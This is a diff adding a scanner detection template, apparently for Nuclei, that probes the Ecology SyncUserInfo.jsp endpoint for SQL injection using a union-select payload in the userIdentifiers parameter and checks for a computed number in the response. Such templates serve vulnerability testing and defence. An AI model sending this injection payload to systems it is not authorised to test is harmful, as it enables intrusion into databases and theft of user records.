@@ -1,0 +1,26 @@
+id: poc-yaml-ecology-syncuserinfo-sqli
+info:
+  name: Ecology Syncuserinfo SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Ecology Syncuserinfo endpoint.
+
+variables:
+  r1: '{{rand_int(40000, 44800)}}'
+  r2: '{{rand_int(40000, 44800)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({{r1}}*{{r2}}),null'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{to_number(r1)*to_number(r2)}}'
